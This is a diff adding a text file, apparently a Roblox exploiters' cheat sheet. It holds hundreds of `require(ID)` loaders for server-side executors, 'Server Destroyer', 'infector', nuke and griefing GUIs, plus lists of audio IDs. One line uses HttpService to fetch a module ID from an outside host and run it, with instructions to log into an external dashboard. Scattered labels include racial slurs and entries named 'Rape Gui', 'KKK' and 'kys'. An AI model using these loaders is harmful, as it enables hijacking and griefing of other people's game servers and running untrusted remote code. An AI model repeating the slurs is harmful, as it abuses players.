@@ -1,0 +1,3152 @@
+
+ ▄████▄  ▓█████  ██▓     ███▄    █  ██▓ ██ ▄█▀
+▒██▀ ▀█  ▓█   ▀ ▓██▒     ██ ▀█   █ ▓██▒ ██▄█▒ 
+▒▓█    ▄ ▒███   ▒██░    ▓██  ▀█ ██▒▒██▒▓███▄░ 
+▒▓▓▄ ▄██▒▒▓█  ▄ ▒██░    ▓██▒  ▐▌██▒░██░▓██ █▄ 
+▒ ▓███▀ ░░▒████▒░██████▒▒██░   ▓██░░██░▒██▒ █▄
+░ ░▒ ▒  ░░░ ▒░ ░░ ▒░▓  ░░ ▒░   ▒ ▒ ░▓  ▒ ▒▒ ▓▒
+  ░  ▒    ░ ░  ░░ ░ ▒  ░░ ░░   ░ ▒░ ▒ ░░ ░▒ ▒░
+░           ░     ░ ░      ░   ░ ░  ▒ ░░ ░░ ░ 
+░ ░         ░  ░    ░  ░         ░  ░  ░  ░   
+░                                             
+-----------------Made By Celnik__------------------------
+
+require(5257685661):Fire("urnamehere") - Server Destroyer GUI
+
+require(4937823608).load("urnamehere") - UTG
+
+require(4945821345).lmao("urnamehere") - UTG Epix
+
+require(5673170715).Leak("urnamehere") - Undetected Hub V2
+
+require(5099140412).Aqua("urnamehere") - Aqua Hub
+
+require(5492934148):Fire("XD","urnamehere") Mr Bean Admin
+
+require(4863172339).Enduro("urnamehere")- Rape Gui
+
+require(5160216694).Ass("urnamehere") - Project Scripted GUI
+
+require(4937114966):SH("urnamehere") - Sakura Hub
+
+require(5516943300).Leak("urnamehere") - Undetected Hub V2
+
+require(4934614538):adrian("urnamehere")- Adrian’s Good UTG
+
+require(4977590940).load("urnamehere") - baldiinvasion2’s utg
+
+require(5868025435).load("urnamehere") - D3S SS
+
+require(5028947792).Lmao("urnamehere") - Hoarder GUI
+
+require(5098731275).eliza("orangeado") - Epic Stand
+
+require(4902600443)("Stand Name", "urnamehere") - Jojo Stands
+
+require(5702333343).load("urnamehere") - Roz Hub
+
+require(5845339294).EH("urnamehere") - Ethereal Hub
+
+require(5128274968).GetAntsUtgV5("urnamehere") - Ants Hub V5
+
+require(4831353616).xh("urnamehere") - Xio’s Hub
+
+require(4634558715)("urnamehere") - Best Hub
+
+require(5356256564).SubscribeYouSkid("urnamehere") - Subhub
+
+require(5419240318).PraiseSkidGod("urnamehere") - Hexine Gui
+
+require(4829576129).SpringHub("urnamehere") - Spring Hub
+
+require(4706570992).load("urnamehere") - Unleaked SS
+
+80856982780013 - uk bitches
+
+81483247335443 - knuckles white
+
+110866118105943 - cyberbully channels are cancer
+
+85961557571716 aiming by pitfall
+
+117928155571957 better off alone remix
+
+105835661284326 play poker
+
+134397522703582 85th attempt parody
+
+121890613790159 boom x4 remix
+
+95997609837186 shooting range wifiskel
+
+82734373152537 asheville glaive LQ
+
+79898722776823 kid cudi the return of chip douglas
+
+75611288974280 you have been ratted ratted
+
+87635539433153 -- Frigo camela funk
+
+111543364511665 -- bobombinin funk
+
+135107996207184 - skin - otuka 
+
+Roxxane - Minecraft  : 129754063325108
+
+lil Tecca - Minecraft : 107042626686342
+
+102115119120233 - japanese - ruby-chan, nani ga suki
+
+90728676189307 - Cochise - Hatchback
+
+122227644172989 - nigga rap
+
+102629575639607 - tyler the creator - see you again - jersey
+
+104575671082804 - Telepatia - Kali Uchis.
+
+86516358177000 - ny drill
+
+104754926270700 - pinkpanthress jersey
+
+99900386102298 - spanish song i think called no gato
+
+87196992078027 - because of you
+
+115326754072630 - nigga rap
+
+95045378017000 - violent crimes jersey pretty ass
+
+127671569092786 - 20 min jersey pretty ass
+
+74656100424620 - Huit Octombre jersey
+
+95489036869789 - nam nam nam song 
+
+111818874589835 - get away
+
+117928155571957 - better off alone russian with swears
+
+80856982780013 - uk bitches
+
+require(13046309669).LuasToolPackV2("LuaGunsX","LuasToolPackV2") toolpack i made
+
+require(11669791984).SD() skid shield
+
+require(14662181421) zephal ss infector
+
+require(12255439223):koolaidv("r6", "LuaGunsX") koolaid
+
+require(15484864694).DDG("LuaGunsX") duckduckgoing
+
+require(15485134455).DecoyEXE("LuaGunsX") decoy executor
+
+require(13685221311):Galaxy("LuaGunsX") galaxy hub v3
+
+require(14290566563):Galaxy("LuaGunsX") galaxy hub v4
+
+require(14811954535)("LuaGunsX", "CC688826-FD5B-40EB-AACA-3BC418C0EA44") fumo hub v4
+
+require(13052199549):Fire("DogeMuchWowed", "iOrb") iorb
+
+require(14142251709):BloxCord() bloxcord
+
+--multipurpose modules
+
+require(191816425)("LuaGunsX", "Doge") Doge
+
+require(191816425)("LuaGunsX", "Boombox") Boombox
+
+require(191816425)("LuaGunsX", "Bloxikins") Bloxikins
+
+require(191816425)("LuaGunsX", "Guitars") Guitars
+
+require(191816425)("LuaGunsX", "LOLcat") LOLCat
+
+require(191816425)("LuaGunsX", "PurpleSword") Purple Sword
+
+require(191816425)("LuaGunsX", "SpyEye") Spy Eye
+
+require(191816425)("LuaGunsX", "MakeNPC") Make a NPC
+
+require(191816425)("LuaGunsX", "TMMKnife") TMMKnife
+
+-+- doomshop
+82119257138399 bobby2pistolz
+73827461765270-timeless Nbashiesty Eze Mexicanjokers
+132899781016393 - fire unleaked rap 
+89529447730214 - call me maybe remix (bypassed slurs
+criminal mafia - chillin on the porch (instrumental)
+86047613813943 - phonk thing - NbaShiesty x Eze x MexicanJokers (archived) so works on some games
+pure imagination - freddie dredd - 71187723350316
+110819538477291  NUNCA SOLARIS
+70586618643318  BRAINZ FUNK
+91825664919227   AVANGARD 2.0
+136581343715691  ESSE TARA
+81068115852250  CITY LIGHTZ PR FUNK
+110035574248336 DARK_MOV
+86513000856366 JUDAS WAVE
+17422074849 BRX PHONK
+70914402384955 PROMPTO
+97669622507475 MONTAGEM DANCA 
+76096754976120 - Coryxkenshin the chosen one rap
+137155874195108 - steve lacy - infrunami
+113713619115513 - steve lacy - bad habit
+87486184689680  - yunhead - again (lieu cover)
+101420489263329 - bloodhound lil jeff - shouldve saw it 
+118263118929793 - osquinn - sticks and stones
+73207873123211 scene core 
+122875136396812 x2 scene
+
+MORE SCENE AUDIOS HERE 
+https://create.roblox.com/store/audio?artistName=Крутой%20Стаяши
+GOOD AUDIOS HERE TOO
+https://create.roblox.com/store/audio?artistName=ghostridaa
+
+108244866037792 F N
+
+72075853222295 - doodle
+
+90605447422215 - the love i lost
+
+133848514842382 - кокоро ремикс
+
+112995556527147 - hit num. 2
+
+88113502029169 - silent hill breakcore
+
+114436014434221 - марк фонк сигма эдит
+
+81477881808390 - распять
+
+99396066311595 - bratz
+
+83712066133001 - onda
+
+87871612084824 - wheel
+
+104502712965303 - auudiioo
+
+117584306561380 good audio
+
+103966264473167 hospital playa - murda 3 loop
+
+137111391823848 - LIL THRAXX FK HIM FK HER
+
+111733975796881 babytron
+
+88309689653569 idk rap
+
+90697482398600 lungskull or sum sh
+
+121528450711301 dance till death loop
+
+require(114173422439635):Pload("abobastrawberry")
+
+Polaria - require(123255432303221):Pload("user")
+Secret Service Panel - require(17073274775)("pfzq")
+Secret Service Panel DEX Version - require(16977144399)("pfzq")
+
+Secret Service Administration - require(16668858335).skid("pfzq","ssa")
+
+Old Secret Service Administration - require(16668984909).load("pfzq","1994 days on roblox")
+
+Old Secret Service Panel - require(17632411730){Owners={"pfzq"},Prefix=';'}
+
+Obunga -require(97971729290214)()
+
+Obuga Citizen One - require(123134147078298)()
+
+DreamyBull Gui , By Hamad - require(18790530478)("pfzq")
+
+infinitie yield - require(7634392335)("pfzq")
+
+Fbi executor - require(18178393297)("pfzq")
+
+SS v2 So Cool - require(6405516751).load("RobloxBoy4762") 
+
+primadon - require(17513697824)("Username")
+
+AOS Admin - require(16661955141):Fire("pfzq")
+
+ur bads AOS Admin - require(16771067578):Fire("pfzq")
+
+Mr Bean admin - require(16638501761){Owners={"pfzq"},Prefix=';'}
+
+Mcdonalds Admin - require(16668583391){Owners={"pfzq"},Prefix=';'}
+
+Strato admin - require(6590963180).load("pfzq")
+
+V3rmillion Admin - require(16991153209).load("pfzq")
+
+MML Admin -  require(7573703059).MMLHax("pfzq")
+
+Fe hax - require(17472456139).fehax("yourname")
+
+Nexus Admin - require(16988699893)("pfzq")
+
+Bee Exoliner admin V2 - require(2969225161):Fire("Nob","pfzq")
+
+Intent Admin - require(16988255787):Fire("Intent","pfzq")
+
+Frank's Admin - require(16988244323):FranksAdmin("Frank","pfzq")
+
+Infyield Admin - require(4832971989)("RobloxBoy4762")
+
+Moon's Infyield Admin - require(16988709094)("pfzq")
+
+Cooks Infyield Admin - require(16662939551)("pfzq")
+
+Adonis Admin - require(16662768931):GetAdmin("pfzq","Hi??")
+
+Quantom Admin - require(3048207279):Fire("kermitwashere,ok","pfzq")
+
+Rocky2U Admin - require(16662837893).AddRocky("pfzq")
+
+sans: require(4952709475).load("userheredummy")
+
+scp 096: require(5972874843).load("userheredummy")
+
+3rd dimension: require(9254836590)("userheredummy")
+
+lost soul(IMMORTAL): require(5390158029).Dark("userheredummy")
+
+zalgo: require(5195961797).eliza("userheredummy")
+
+guest 666(LAGGY): require(5984643716).load("userheredummy")
+
+GONER: require(4513235536).G("userheredummy")
+
+pee: require(2972136307).load("userheredummy")
+
+knife v4: require(18665717275).load("userheredummy")
+
+rick and morty portal(kinda broken): require(2944367975).load("userheredummy")
+
+hammer: require(8038037940).CLoad("userheredummy")
+
+void guardian: require(6375614282).load("userheredummy")
+
+nuke: require(4832967293):Fire("userheredummy")
+
+fraud(id fr, IMMORTAL): require(4952179933).Fraud("userheredummy")
+
+sin unleashed: require(2787132106):Run("userheredummy",'I baked you a pie')
+
+NOOT NOOT(SERVER DESTROY): require(5034863407).subtosyntax64("userheredummy")
+
+neurotic: require(5617600468).load("userheredummy")
+
+chara boss: require(4106669917).load("userheredummy")
+
+instant nuke: require(4178274460).Nuke(Vector3.new(userheredummy),1000)
+
+aqua hub: require(5099140412).Aqua("userheredummy")
+
+roz hub(YOU CANT MOVE IT): require(5702333343).load("userheredummy")
+
+super cool banisher: require(5226367856).rk("userheredummy")
+
+Aureas(gui, really good): require(6036737823).CrackedByIncreaseron("userheredummy")
+
+snake banisher v3: require(4967804765).SBV3("userheredummy")
+
+phantom forces guns: require(0xA8526D5D).giveGuns'userheredummy'
+
+Shadow kars: require(6058159336).load("userheredummy")
+
+the defiant: require(6168743245).load("userheredummy")
+
+dimensiona: require(6058166660).load("userheredummy")
+
+require(0x3ba12f9f1).PLSPLS("username") - f00plkidd v5 require(14921175600).zzzzzzzzzzzzz55555555555555555555("LordAltAccount7") -l0ckkidd v5
+
+require(0x25b56b8f7+-0x6a72c6b3d+0x812296b09):SHHH144anzHUB("SupremeSkidder") - 144anz hub
+
+require(17161655683).SkibidiToilet("username") - ITSNOTSKELETON V11
+
+require(0x7435b09c4+0x38501a58+0x5a59*-0xa0396):opss144anz("username") - 144anz SS
+
+require(14723857690).load("Ur Fak name") - Elmarz gui v3
+
+require(14741436840).gui("name") - HOP1K
+
+require(7116428237).SBV4("your name loser") - real snake banisher
+
+require(6324372525).fse("ur name skid") - Fumo script executor
+
+require(7646868348):XD("name here") - SGH 3 gui thingy
+
+require(12796454422).lek("UserName") - c00lgui v3 edit
+
+require(9821168174)("yourname") - k00p coffe map thing
+
+require(17340805099).ez("Reqllifeguy45") - m00pkidd gui
+
+require(2609384717).load("urfuckinguser") - Topkek gui
+
+require(5672829911).hack("USERNAME BRO") - hack script
+
+require(17802705815).phone("Username") - PilinGui pocket
+
+require(17804242139).lol("Username") original PilinGui
+
+require(12573742929)(username) - kfc map
+
+require(7192763922).load("playername") - HD admin ranker and loader
+
+require(16965767706):load("username") - k00pgui v101
+
+require(16213431127).k00perz("") - k00pgui v5
+
+require(18305545828).evil("your username") - horror gui v1
+
+require(5702244094).space("YourNameHere") - Space Elevator Map Gui
+
+require(8937504521).dsadsdasd8du8sau8saud8adu8du8asd8as8d8ns9dash8s6ad8h9uash9ud8as8d98as89dsah98d8hsh8usah9d88asd98uhash9ud89s8uhasd98hsah98udsa989asd98huash9u8das9d89huasd8u9hsa8h9udashh8ashd8u9ashud8sah8d8hu9asd8hu9as8h9udash9d8as8d8hu9sa8hud9as9u8d8h9usdhu89s8h9da8h9dadh8ad89a98dsa("Banvadis") - Gentalmans GUi
+
+require(7904530401).bobux("GlichGamerF") - Robux tools
+
+require(5919418431).hub("Your Username") - TY hub
+
+require(10868847330):pls("Your Username") - exser new code: c00lkidds
+
+require(2823974237).giveGuns'figsgksss' Gun Giver
+
+require(17823616822).lol("figsgksss") pilinGui require(17850370668).lol("figsgksss") pilinGui more distruvtive
+
+require(10868847330):pls("figsgksss") ExSer In game Code: c00lkidds
+
+require(10868847330):pls("your name") code c00lkidds
+
+spawn(function()pcall(function()coroutine.wrap(pcall)(require,tonumber(game:service("HttpService"):GetAsync("https://extra.sukru.serv00.net")))end)end) Put in executor go to https://dash.exser.pp.ua login with alt!!! go to account tab put your name. then go to hub and run scripts
+
+require(16052382566).PoopToolsV2("figsgksss") goofy tool pack gui -------------maps------------------
+
+require(17871666984).map() Watch a tv map
+
+require(17825574180).map() k00pkid map
+
+require(17871796694).map() Watch a tv map with drs (not working)
+
+require(3117546674):Fire('Your Roblox Username') script for Gunjourer
+
+require(3117564747):Fire('Your Roblox Username') script for Magic Power
+
+require(3117661544):Fire('Your Roblox Username') script for Dual Ultima
+
+require(3117669110):Fire('Your Roblox Username') script for a Titan (broken)
+
+require(3117679218):Fire('Your Roblox Username') script for god and bad cop
+
+require(3117682928):Fire('Your Roblox Username') script for Glitch Master
+
+require(3117687124):Fire('Your Roblox Username')script for Brutal Overlord
+
+require(3117694773):Fire('Your Roblox Username') script for ???
+
+require(3117697757):Fire('Your Roblox Username') script for ???
+
+require(3117706978):Fire('Your Roblox Username') script for Nebula (borken)
+
+require(3117712774):Fire('Your Roblox Username') script for ???
+
+require(3117717032):Fire('Your Roblox Username') script for John Wik
+
+require(3117721105):Fire('Your Roblox Username') script for Karmapange
+
+require(3117724565):Fire('Your Roblox Username') script for ???
+
+require(3117564747):Fire('Your Roblox Username') script for Magic power
+
+require(2681865333):Fire('ok', 'Your Roblox Username') script for grab Knive V4
+
+Grab Knife V1: require(2836693511):Fire('Your Roblox Username','i baked you a pie')
+
+Grab Knife V2: require(2845941230):Fire('Your Roblox Username','i baked you a pie')
+
+Grab Knife V3: require(2829943043):Run('Your Roblox Username','i baked you a pie')
+
+ShotGun - require(03114598550):Fire("Your Roblox Username")
+
+Matteo's gun - require(03099649438).load("Your Roblox Username")
+
+Rare Sword - require(03099697999).load("Your Roblox Username")
+
+Rainbow Titan - require(03099691224).load("Your Roblox Username")
+
+Matteo's Flamethrower - require(03099659288).load("Your Roblox Username")
+
+Eraser - require(03099667517).load("Your Roblox Username")
+
+Vape - require(03099678440).load("Your Roblox Username")
+
+Dualecider - require(2790149731):Run('Your Roblox Username')
+
+Scary ambient(by me lol) - require(03099579132).load("Your Roblox Username")
+
+lOsT hOpE - require(3098076859).load("Your Roblox Username")
+
+Lost Bye Bye - require(03099474099).load("Your Roblox Username")
+
+You are an idiot - require(03095188600).load("Your Roblox Username")
+
+kys - require(03095160836).load("Your Roblox Username")
+
+Mexican/Russian doge- require(3095125182).load("Your Roblox Username")
+
+YOU NEED JESUS - require(3086965141):executeModule("Your Roblox Username")
+
+Mr.Pixels - require(2995020929):Fire("oof","Your Roblox Username)
+
+require(03095105955).load("Your Roblox Username")
+
+Pizza Guy - require(02980464351).load("Your Roblox Username")
+
+Moonman (KKK) - require(03095022841).load("Your Roblox Username")
+
+SS GUI - require(03090163777).load("Your Roblox Username")
+
+UTG GUI - require(2993514878):Fire("Your Roblox Username")
+
+A GUI - require(3058559294).load("Your Roblox Username")
+
+Darth Vader - require(02980473200).load("Your Roblox Username")
+
+Drunk Guy - require(03087849096).load("Your Roblox Username")
+
+Purple Guy - require(03087845888).load("Your Roblox Username")
+
+Ice Cream - require(3087708111).load("Your Roblox Username")
+
+wHAT ANOTHER ONE - require(03029193386):Fire("Your Roblox Username")
+
+Elo Blasio - require(2891645338).sans('undertale','"Your Roblox Username")
+
+Jojo Boie - require(3034302901):Fire("Your Roblox Username")
+
+WYD - require(2851043168).load("Your Roblox Username")
+
+TopKEK - require(2609384717).load("Your Roblox Username")
+
+My executor - require(3084491250).load("Your Roblox Username")
+
+Unanchor all - require(03066959022):Fire("Your Roblox Username")
+
+PUBG Pan - require(03078332852):Fire("Your Roblox Username")
+
+Insanity (C Throw head | T omg) - require(2787111216):Run('Your Roblox Username')
+
+SworD OmGG!11 - require(2972237186).load("Your Roblox Username")
+
+require(2838415098).load("Your Roblox Username")
+
+Quantom Rewritten (Press P for commands) - require(3048207279):Fire('kermitwashere,ok','Your Roblox Username')
+
+Kartic - require(2967687879).load("Your Roblox Username")
+
+Shackluster wheelies - require(2967700018).load("Your Roblox Username")
+
+Internal War - require(2967724627).load("Your Roblox Username")
+
+Dominus Corona - require(2967742797).load("Your Roblox Username")
+
+require(3023953976).load("Your Roblox Username") -- CreteriskBan Hammer
+
+require(3024044769).load("Your Roblox Username") -- ShackLuster's BanHammer
+
+require(3024569233).load("Your Roblox Username") -- ToadRoast
+
+require(3024624301).load("Your Roblox Username") -- Pandora
+
+require(3024848196).load("Your Roblox Username") -- Illuminati
+
+require(3024874104).load("Your Roblox Username") -- Dual Ultima
+
+require(3024941794).load("Your Roblox Username") -- Draw script
+
+require(3024959054).load("Your Roblox Username") -- God's abandoned daugher
+
+require(3024043748):Start("Your Roblox Username","AAA") -- Gear stuff (detain, taze, molotov)
+
+require(2992183083):Fire("Your Roblox Username") -- RunicTunes
+
+require(2751513564).load"Your Roblox Username" - Grenade
+
+require(2500605002).give"Your Roblox Username" - MML Admin
+
+require(2500657841).load"Your Roblox Username" - Van
+
+require(2500743596).load"Your Roblox Username" - Server Destroyer GUI
+
+require(2500686011).load"Your Roblox Username" - Troll GUI
+
+require(2500710590).load"" - Keemstar All
+
+require(2500701749).load"Your Roblox Username" - Cafe Griefer GUI
+
+require(2505714651).fuc("victim","Your Roblox Username") - Rape
+
+require(2505737607).load"Your Roblox Username" - UVG
+
+require(2505751313).load"" - Zombie Horde
+
+require(2508391080).load"Your Roblox Username" - Thanos Hand
+
+require(2603280675).load"Your Roblox Username" - Nuke
+
+require(2609384717).load"Your Roblox Username" - Topkek 3.0
+
+require(2959521988).ooga"Your Roblox Username" - Really Mad Guy
+
+require(2959535061).load"Your Roblox Username" - Rufus Grab Knife
+
+require(2959540822).load("fun for the whole family",game.Players.Your Roblox Username) - Van GUI
+
+require(2918747265).load"Your Roblox Username" - Xester
+
+require(2856360953).load"Your Roblox Username" - Memeus V2
+
+require(2855602591).load"Your Roblox Username" - Doritos
+
+require(2831237761).load"Your Roblox Username" - Minigun
+
+require(2871277680).load"Your Roblox Username" - Noob that eats
+
+require(2855989248).load"Your Roblox Username" - Memeus V1
+
+require(2946634514).load"Your Roblox Username" - Caducus the Fallen God
+
+require(2945922105).load"Your Roblox Username" - Sniper
+
+require(2870923100).load"Your Roblox Username" - Reaper
+
+require(2946965085).load"Your Roblox Username" - Nuke
+
+require(2737070070).load"Your Roblox Username" - Insane/Dab GUI
+
+require(2552620429).load"Your Roblox Username" - UFO
+
+require(522666193).giveAdmin"Your Roblox Username" - Epix
+
+require(519455802).giveAdmin"Your Roblox Username" - Kohls
+
+require(2113801730).load"Your Roblox Username" - Noot
+
+require(2939504811).sandraandnathorixare("GONE","Your Roblox Username") - Nebula star glitcher
+
+require(2909209825).load"Your Roblox Username" - Broken Gladiator_LS
+
+require(2872994194).bruh("moment","n word","Your Roblox Username") - Grab Knife V4 (all modes but broken asf)
+
+require(2603308233).load"Your Roblox Username" - Bike
+
+require(2654011167).load() - Mexican wall
+
+Screamer - require(03091272839).load("Your Roblox Username")
+
+require(2673009791).load"Your Roblox Username" - Killbot
+
+require(2845325548).uwu(game.Players.Your Roblox Username) - Trap Rifle
+
+require(2845358736).uwu(game.Players.Your Roblox Username) - Monika
+
+require(2845370647).uwu(game.Players.Your Roblox Username) - CKBackup Cop
+
+require(2845835890).ooga"Your Roblox Username" - Demon
+
+require(2845906776).ooga"Your Roblox Username" - Red sword
+
+require(2845929020).ooga"Your Roblox Username" - John Doe
+
+require(2847912217).load"Your Roblox Username" - gunjouner
+
+require(2847934044).load"Your Roblox Username" - pennywise
+
+require(2847950761).load"Your Roblox Username" - drone
+
+require(2847970827).load"Your Roblox Username" - voodoo child
+
+require(2850994438).load"Your Roblox Username" - MLG Gun
+
+require(2851024356).load"Your Roblox Username" - Topkeke Arms 2.0
+
+require(2851050332).load"Your Roblox Username" - Sans
+
+require(2852336223).load"Your Roblox Username" - Star Glitcher (like the 3th time that i put star glitcher)
+
+require(2852366537).load"Your Roblox Username" - Noobicider
+
+require(2852378277).load"Your Roblox Username" - Fangirl Killer
+
+require(2858525380).load"Your Roblox Username" - PUBG Pan
+
+require(2883339055).bruh("xdxdxd","owo uwu owo","Your Roblox Username") - Laser Guns
+
+require(2883353470).lolXD("sad boi","Your Roblox Username") - the cursed hand
+
+require(2883368151):Fire("weird flex","but ok","Your Roblox Username") - 6 swords
+
+require(2885143717).thinking("so","guys","we","did","it","Your Roblox Username") - Grab Knife V1
+
+require(2885169621).dontcare("n0b","Your Roblox Username") - Blazing heart sword
+
+require(5802346180).eliza(urnamehere) - EARRAPE
+
+require(7260532691)("urnamehere") - Huge Lord
+
+require(5802335492).eliza(urnamehere) - LOLOLOLOL
+
+require(4832967293):Fire("urnamehere") - NUKE GUI
+
+require(5610305900)("urnamehere") - TOPKEK V5
+
+require(4874364435)("urnamehere") - TOPKEK V4
+
+require(5034863407).subtosyntax64("urnamehere") - NOOT NOOT
+
+require(5115793531).scare(urnamehere) - Something From Spongebob Server Destroyer
+
+require(5564800243).fehax("urnamehere") - CHATHAX
+
+require(5903403087).load("urnamehere") - IMPOSTER CHAT
+
+require(5617600468).load("urnamehere") - Neurotic
+
+require(5193737424)("urnamehere",true) - ULTRA NOOB SPAMMER
+
+require(1192815372).load'urnamehere' - RANDOM MAP
+
+require(5621190626).OmegaFlower("urnamehere") - OMEGA FLOWEY
+
+require(4106669917).load("urnamehere") - Chara Boss
+
+require(4483948796).load("urnamehere") - Pyro Flamethrower
+
+require(4581300009).xd("urnamehere") - RODA ROLLA DA
+
+require(4178274460).Nuke(Vector3.new(urnamehere),1000) - NUKE
+
+require(4564681456).catgirl(urnamehere) - CATGIRL TROLL
+
+require(4124996597).swano(urnamehere) - AD Virus
+
+require(4024051473).call("all") - Builderman Discord Call
+
+require(5257685661):Fire("urnamehere") - Server Destroyer GUI
+
+require(4937823608).load("urnamehere") - UTG
+
+require(4945821345).lmao("urnamehere") - UTG Epix
+
+require(5673170715).Leak("urnamehere") - Undetected Hub V2
+
+require(5099140412).Aqua("urnamehere") - Aqua Hub
+
+require(5492934148):Fire("XD","urnamehere") Mr Bean Admin
+
+require(4863172339).Enduro("urnamehere")- Rape Gui
+
+require(5160216694).Ass("urnamehere") - Project Scripted GUI
+
+require(4937114966):SH("urnamehere") - Sakura Hub
+
+require(5516943300).Leak("urnamehere") - Undetected Hub V2
+
+require(4934614538):adrian("urnamehere")- Adrian’s Good UTG
+
+require(4977590940).load("urnamehere") - baldiinvasion2’s utg
+
+require(5868025435).load("urnamehere") - D3S SS
+
+require(5028947792).Lmao("urnamehere") - Hoarder GUI
+
+require(5098731275).eliza("orangeado") - Epic Stand
+
+require(4902600443)("Stand Name", "urnamehere") - Jojo Stands
+
+require(5702333343).load("urnamehere") - Roz Hub
+
+require(5845339294).EH("urnamehere") - Ethereal Hub
+
+require(5128274968).GetAntsUtgV5("urnamehere") - Ants Hub V5
+
+require(4831353616).xh("urnamehere") - Xio’s Hub
+
+require(4634558715)("urnamehere") - Best Hub
+
+require(5356256564).SubscribeYouSkid("urnamehere") - Subhub
+
+require(5419240318).PraiseSkidGod("urnamehere") - Hexine Gui
+
+require(4829576129).SpringHub("urnamehere") - Spring Hub
+
+require(4706570992).load("urnamehere") - Unleaked SS
+
+require(5121570975).SpaghettiHub("urnamehere") - Spaghetti Hub
+
+require(5705720748).Lightning(string.reverse("urnamehere")) - Lightning Cannon ( Z, X, C, V, B, M, T, Y, F, K)
+
+require(5620645578):ASH("urnamehere") - Adrian Hub
+
+require(5580599015).load("urnamehere") - Avry Hub
+
+require(5098133040):FirePire("urnamehere:Pire") - Pire Hub
+
+require(5487274946).GLITCHED("urnamehere") - Glitchhub Premium
+
+require(5126648745).load("urnamehere") - Anonymous UTG
+
+require(4614455084).Under("urnamehere") - Under UTG
+
+require(5352721272):Fire("urnamehere") - Sonichub
+
+require(3497222070).load("urnamehere") - UTG Edit
+
+require(5828128589).honey(string.reverse("urnamehere")) - Zero Two Lightning Cannon ( Z, X, C, V, B, M, T, Y, F, K)
+
+require(5970690882).ps1("RICKLER”) - Fearful Harmony
+
+require(5226367856).rk("urnamehere") - Super Cool Banisher
+
+require(4952179933).Fraud("urnamehere") - Fraud
+
+require(5963380437).publicbuild("urnamehere", "Retro") - Retro Hub
+
+require(6009547419).Fire("urnamehere") - Vascepa Hub
+
+require(5543125369).eliza("urnamehere") - Eliza Hub
+
+require(6062281254).load(urnamehere) - South Park Video Troll
+
+require(6036737823).CrackedByIncreaseron("imlucixD34") -Aureus V1
+
+require(6085762856).BINGBONG("NoNameNeeded") - Crab Rave
+
+require(5597042098).chinaAnnounce("urnamehere") - Xi Jinping
+
+require(3010581956):Fireplace("urnamehere") - Dark Dex
+
+require(4867426485):SD2("urnamehere") - Cooldown Nuke
+
+require(6088717643)("65464593") - Immortality Lord ( Z, X, Q, F, C )
+
+require(6123029966).vian("urnamehere") - Viankos ( F, Z, X, C)
+
+require(5856873964).PharaohCannon(string.reverse("urnamehere")) - Pharaoh Lightning Cannon ( Z, X, C, V, B, M, T, Y, F, K)
+
+require(4658687827).nukes("urnamehere") - The End Nuke
+
+require(4555115496).gw("urnamehere") - Trollimbius Gui
+
+require(4154130567).ik("urnamehere") - Adrian’s UTG
+
+require(4967804765).SBV3("urnamehere") - Snake Banisher V3
+
+require(4903995654)(65464593) - Immortality Cannon ( E, Q, R, G, F, T, K, M )
+
+require(4992512410):Asylumgotskidded("urnamehere") - Asylum Hub
+
+require(6114289913).c00lgui("urnamehere") - c00lgui remake
+
+require(5308680571).load("urnamehere") - GUI Hub
+
+require(4813227802){"urnamehere"} - PikaX UTG
+
+require(0xA8526D5D).giveGuns'urnamehere'- Phantom Forces Guns
+
+require(5146396793).load("urnamehere") - GodSpawn GUI
+
+require(5344766102).fare("urnamehere") - Fare’s Hubhub
+
+require(6097532439):redlightsdontleak("urnamehere") - Redlights.exe
+
+require(6099373575).load("urnamehere”) - Ravenger Claws V2 ( Q, E, R, Y )
+
+require(6222361140).load("urnamehere”) - Shadow Gunner ( T, Z, X )
+
+require(6027795939).load("urnamehere") - Cyber Monarch
+
+require(6099324864).load("urnamehere") - Kuma ( Q, E )
+
+require(4471066396).load("urnamehere") - Bad Karma
+
+require(6175490752).load("urnamehere”) - Void Boss ( Z, X, C, V )
+
+require(6099241563).load("urnamehere") - Xester V2 ( E, R, T, G, Z, M, Y, F, Q, E, R, Y, G )
+
+require(6099316092).load("urnamehere") - Veltex ( Q, E, T, F, J )
+
+require(6058159336).load("urnamehere") - Shadow Kars
+
+require(6168743245).load("urnamehere") - The Defiant
+
+require(6099363076).load("urnamehere") - The Disturbed ( Q, E, Y, F )
+
+require(6042859321).load("urnamehere") - Jester ( T, Z, X, V )
+
+require(6058166660).load("urnamehere") - Dimensiona
+
+require(4665394711).load("urnamehere") - Server Admin
+
+require(3224070083).load("urnamehere") - Nectula ( T, G, Z, X, V
+
+require(6088494183).load("urnamehere") - Desolate ( R, F, M )
+
+require(6015747481).load("urnamehere") - Brick Hamman
+
+require(5619264516).Dark("urnamehere") - Vaxtemi Boss Battle
+
+require(6056559552).load("urnamehere") - Death Sheriff
+
+require(6027832941).load("urnamehere") - Holy Hand Grenade
+
+require(5813743814).load("urnamehere") - Stick Beater ( Z, X, C )
+
+require(5977500481).load("urnamehere") - Project Light
+
+require(5813695241).load("urnamehere") - Oculus ( Z, X, C, V, M )
+
+require(5617200606).Cyber("urnamehere") - Cyber Knight
+
+require(5390158029).Dark("urnamehere") - Lost Soul ( Q, J, H, G, F, Z, X, C, V, B, SHIFT )
+
+require(5857033951).load("urnamehere") - Achromatic ( M, C, V, Z, NUMBERS )
+
+require(5813836873).load("urnamehere") - Archangel of Light ( Z, X, C )
+
+require(5813799887).load("urnamehere") - Aureola ( NUMBERS, Z )
+
+require(4229413153).load("urnamehere") - Aether Lightning
+
+( CTRL, Q, E, R )
+
+require(5751710030).Sun("urnamehere") - Deadly Laser Sun V3
+
+require(4611999946).load("urnamehere") - Sociopath
+
+require(4490557105).load("urnamehere") - Fallen Anger
+
+require(5068511197).insert("urnamehere") - Military Tank
+
+require(4661847142).load("urnamehere") - Chronos Sentinel
+
+require(5375460203).Player("urnamehere") - Glorious Bastion of Light
+
+require(5605396200):load("urnamehere","Felipe") - Felipe’s Ascension
+
+require(5374597845).Dark("urnamehere") - Echo
+
+require(5346891374).Dark("urnamehere") - Darkomos
+
+require(5270525643).Dark("urnamehere") - Stan ( E, Q )
+
+require(4943481014).Nightmare("urnamehere") - Nightmare ( Q, Z, M )
+
+require(3256686965).load("urnamehere") - Dominus Venari ( Q, T, Z, X, C, V, B, K )
+
+require(5146659840).Dark_Eccentric("Dark_Eccentric", "urnamehere") - Grab Gun ( Z, C, M, G, Q, E, V, N, X )
+
+require(5239955586).Dark("urnamehere") - Siren Head
+
+require(5000363317).UwUMoment("urnamehere") - Kasper Hub
+
+require(4869378421).F3X("urnamehere") - F3X BTools
+
